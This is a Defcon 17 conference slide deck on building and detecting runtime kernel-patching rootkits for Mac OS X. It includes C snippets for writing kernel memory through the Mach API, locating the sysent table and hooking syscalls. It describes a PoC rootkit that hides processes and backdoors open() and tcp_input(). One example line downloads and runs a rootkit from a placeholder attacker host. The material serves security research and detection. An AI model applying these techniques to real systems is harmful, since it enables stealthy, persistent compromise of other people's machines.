# Bosse Eriksson / Bitsec
## Runtime Kernel Patching on Mac OS X
### Defcon 17, Las Vegas

#### About Me
- **Name:** Bosse Eriksson
- **Role:** Security Consultant/Researcher at Bitsec
- **Interest:** A strong inclination towards breaking things
- **Recent Focus:** Investigating rootkit techniques for Mac OS X

#### Agenda
1. Introduction
2. What is a Rootkit?
3. OS X, BSD, and XNU
4. Runtime Kernel Patching
5. Runtime Kernel Patching on OS X
6. Proof of Concept (PoC) for Runtime Kernel Patching Rootkit on OS X
7. Rootkit Detection
8. References
9. Q&A

### What is a Rootkit?
- **Definition:** A program designed to maintain access to a system.
- **Features:**
  - Local or remote backdoors
  - Typically requires root access
  - Not an exploit or a trojan horse
  - Emphasizes stealth
  - Hides files, processes, and sockets
- **Types:**
  - **Userspace:** 
    - Easy to implement
    - Easy to discover
  - **Kernelspace:**
    - Harder to implement
    - Much harder to detect if done properly

### Pwning – Simple Illustration
- **Exploit Example:**
  ```sh
  $ ./0day –h mail.doxp*ra.com
  - connecting…
  - exploiting…
  % uname –a; id
  FreeBSD living*nd.org 7.0-STABLE FreeBSD 7.0-STABLE #0: Mon Jul 22 18:18:06 PDT 2008
  i386
  uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
  ```
- **Rootkit Example:**
  ```sh
  % wget http://attackerhost/rootkit > /dev/null ; chmod +x rootkit
  % ./rootkit -i
  ```

### Rootkit Examples
- **Userspace:**
  - Various malicious patches to `ls`, `netstat`, `ps`, etc.
  - Binary patches
- **Kernelspace:**
  - **Phalanx by rebel:** Runtime kernel patching rootkit for Linux 2.6 using `/dev/mem` to patch kernel memory and hook syscalls.
  - **SucKIT by sd:** Runtime kernel patching rootkit for Linux 2.4 (SucKIT 2 for Linux 2.6) using `/dev/kmem` to patch kernel memory and hook syscalls.
  - **Knark by Creed:** LKM for Linux 2.2, hooks syscalls.
  - **WeaponX by nemo:** Kernel module (KEXT) for OS X < 10.3, the first public OS X kernel rootkit.

### OS X, BSD, and XNU
- **XNU:**
  - The kernel of the OS X operating system
  - Built on both BSD and Mach technology
- **BSD Layer:**
  - Networking
  - Processes
  - POSIX API and BSD syscalls
- **Mach Layer:**
  - Kernel threads
  - Interrupts
  - Memory management
  - Scheduling
- **XNU Support Modules:**
  - Kernel Extensions (KEXT)
  - Most common way of subverting the XNU kernel
  - We want something new, right?

### Runtime Kernel Patching
- **Definition:** Subverting the running kernel without using modules (LKM, KLD, KEXT).
- **Functionality:**
  - Hooking system calls to stay hidden and implement various backdoors in the running OS.
  - Manipulating kernel structures in memory.
- **Function Hooking:**
  - Function A calls function B, but "Evil Hook" gets called instead.
  - The "Evil Hook" calls function B and returns the result to function A.

### Basics of Runtime Kernel Patching
1. Allocate kernel memory from userland.
2. Place malicious code in the allocated space.
3. Redirect syscall (or other function) to the malicious code.
4. Profit?

### Usual Approach
1. Find a suitable system call handler.
2. Use a rarely used syscall to avoid race conditions (e.g., `sethostname()`).
3. Backup the system call handler.
4. Redirect the handler to `kmalloc()`.
5. Execute the system call to allocate memory.
6. Restore the system call handler.
7. Is there an easier way?

### Runtime Kernel Patching on OS X – Mach API
- **Functions:**
  - `vm_read()`: Read virtual memory.
  - `vm_write()`: Write virtual memory.
  - `vm_allocate()`: Allocate virtual memory.

### Tasks and Threads
- **Tasks:**
  - Logical representation of an execution environment.
  - Contains one or more threads.
  - Has its own virtual address space and privilege level.
- **Threads:**
  - Independent execution entities with their own registers and scheduling policies.
- **Ports:**
  - Kernel-controlled communication channels.
  - Used to pass messages between threads.

### Reading, Writing, and Allocating Memory
- **Reading Memory:**
  ```c
  void *read_mem(unsigned int addr, size_t len) {
      mach_port_t port;
      pointer_t buf;
      unsigned int sz;
      if (task_for_pid(mach_task_self(), 0, &port))
          fail("cannot get port");
      if (vm_read(port, (vm_address_t)addr, (vm_size_t)len, &buf, &sz) != KERN_SUCCESS)
          fail("cannot read memory");
      return (void *)buf;
  }
  ```
- **Writing Memory:**
  ```c
  void write_mem(unsigned int addr, unsigned int val) {
      mach_port_t port;
      if (task_for_pid(mach_task_self(), 0, &port))
          fail("cannot get port");
      if (vm_write(port, (vm_address_t)addr, (vm_address_t)&val, sizeof(val)))
          fail("cannot write to addr");
  }
  ```
- **Allocating Memory:**
  ```c
  void *alloc_mem(size_t len) {
      vm_address_t buf;
      mach_port_t port;
      if (task_for_pid(mach_task_self(), 0, &port))
          fail("cannot get port");
      if (vm_allocate(port, &buf, len, TRUE))
          fail("cannot allocate memory");
      return (void *)buf;
  }
  ```

### Sysent Table
- **Structure:**
  ```c
  struct sysent {         /* system call table */
      int16_t sy_narg;        /* number of args */
      int8_t sy_resv;        /* reserved */
      int8_t sy_flags;       /* flags */
      sy_call_t *sy_call;       /* implementing function */
  };
  ```
- **Locating the Sysent Table:**
  - Landon Fuller developed a method to locate the sysent table using a KEXT.
  - This method works from userland by locating `_nsysent` in memory.
  - The kernel image (`/mach_kernel`) contains the `_nsysent` symbol, which can be resolved by parsing the Mach-O binary.
  - `_nsysent + 32` is the sysent table in memory.

### Modifying the Function
- **Using libs2a to resolve symbols:**
  ```c
  SYSENT *get_sysent_from_mem(void) {
      unsigned int nsysent = s2a_resolve((struct s2a_handler *)&handler, "_nsysent");
      SYSENT *table = NULL;
      table = (SYSENT *)(((char *) nsysent) + 4);
#if __i386__
      table = (SYSENT *)(((uint8_t *) table) + 28);
#endif
      return table;
  }
  ```

### Syscall Hijacking
- **Example:**
  ```c
  asmlinkage int open_hook(struct proc *p, struct open_args *uap, register_t *retval) {
      ...
      sys_open = (void *) 0x001e425c;
      /* do evil stuff */
      return sys_open(p, uap, retval);
  }
  ```

### PoC Runtime Kernel Patching Rootkit for OS X
- **Mirage:**
  - Resolves symbols from the XNU kernel image.
  - Hooks system calls and input handlers using `vm_read()`, `vm_write()`, and `vm_allocate()`.
  - Not detected by `chkrootkit`.

### Demo
- **The Mirage Rootkit:**
  - Process hiding
  - `open()` backdoor
  - `tcp_input()` backdoor

### Rootkit Detection
- **Basics:**
  - Compare the sysent table in memory to a known state.
- **On Mac OS X:**
  - Number of available syscalls is 427 (0x1ab).
  - The original sysentry table is at `_nsysent + 32`.

### Detecting Rootkits
- **Finding the Sysent Table:**
  ```c
  char *get_sysent_from_disk(void) {
      char *p;
      FILE *fp;
      long sz, i;
      fp = fopen("/mach_kernel", "r");
      fseek(fp, 0, SEEK_END); sz = ftell(fp); fseek(fp, 0, SEEK_SET);
      buf = malloc(sz); p = buf;
      fread(buf, sz, 1, fp);
      fclose(fp);
      for (i = 0; i < sz; i++) {
          if (*(unsigned int *)(p) == 0x000001ab && *(unsigned int *)(p + 4) == 0x00000000) {
              return (p + 32);
          }
          p++;
      }
  }
  ```

### Demo
- **Rootkit Detection on Mac OS X:**

### References
- **Articles:**
  - "Abusing Mach on Mac OS X" by nemo, Uninformed vol 4
  - "Mac OS X Wars – a XNU hope" by nemo, Phrack 64
  - "Developing Mac OS X Kernel Rootkits" by wowie & ghalen, Phrack 66
- **Books:**
  - "Mac Hackers Handbook," ISBN 0470395362, by Charlie Miller and Dino Dai Zovi
- **Updated Slides and Code:**
  - [http://kmem.se](http://kmem.se)
- **Acknowledgments:**
  - wowie and the rest of #hack.se, rebel, nemo, and the people at Bitsec

### Q&A
- **Questions?**

### Thank You!
- Thanks for listening! I'll be at the nearest bar getting a beer.